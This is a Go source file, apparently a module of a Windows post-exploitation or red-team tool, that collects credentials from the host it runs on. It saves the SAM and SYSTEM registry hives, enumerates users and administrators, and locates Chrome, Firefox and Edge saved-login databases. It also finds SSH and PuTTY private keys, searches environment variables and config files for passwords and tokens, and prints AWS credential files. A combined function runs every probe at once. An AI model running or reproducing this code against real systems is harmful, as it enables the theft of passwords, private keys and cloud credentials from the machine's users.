package module

import (
	"fmt"
	"strings"
)

// RunCredentialShadow reads SAM and system hives.
func RunCredentialShadow(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== SAM ==='",
		"reg save HKLM\\SAM %TEMP%\\sam.hive 2>nul && echo 'SAM saved (need admin)' || echo 'SAM access denied'",
		"reg save HKLM\\SYSTEM %TEMP%\\sys.hive 2>nul && echo 'SYSTEM saved' || echo 'SYSTEM access denied'",
		"echo '=== Local Users ==='",
		"net user 2>nul",
		"echo '=== Local Groups ==='",
		"net localgroup Administrators 2>nul",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialBrowsers extracts saved credentials from browsers.
func RunCredentialBrowsers(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Chrome ==='",
		"dir \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" 2>nul || echo 'no chrome logins'",
		"echo '=== Firefox ==='",
		"dir \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json\" 2>nul || echo 'no firefox logins'",
		"echo '=== Edge ==='",
		"dir \"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data\" 2>nul || echo 'no edge logins'",
	}
	return run(strings.Join(cmds, " && "))
}

// RunCredentialSSHKeys discovers SSH keys on Windows.
func RunCredentialSSHKeys(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== SSH Keys ==='",
		"dir /s /b \"%USERPROFILE%\\.ssh\\*\" 2>nul || echo 'no ssh keys found'",
		"echo '=== Putty Keys ==='",
		"dir /s /b \"%USERPROFILE%\\*.ppk\" 2>nul || echo 'no putty keys'",
	}
	return run(strings.Join(cmds, " && "))
}

// RunCredentialConfigs scans for credentials in config files.
func RunCredentialConfigs(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Environment Variables ==='",
		"set 2>nul | findstr /i \"password secret key token credential\"",
		"echo '=== Config files ==='",
		"findstr /si /m \"password\" \"%USERPROFILE%\\*.env\" \"%USERPROFILE%\\*.json\" \"%USERPROFILE%\\*.yml\" \"%USERPROFILE%\\*.yaml\" 2>nul | head -20",
		"echo '=== AWS credentials ==='",
		"type \"%USERPROFILE%\\.aws\\credentials\" 2>nul || echo 'no aws creds'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialAll runs all credential dumping probes.
func RunCredentialAll(_ map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"SHADOW", RunCredentialShadow},
		{"BROWSERS", RunCredentialBrowsers},
		{"SSH_KEYS", RunCredentialSSHKeys},
		{"CONFIGS", RunCredentialConfigs},
	}
	for _, p := range probes {
		out, err := p.fn(nil)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
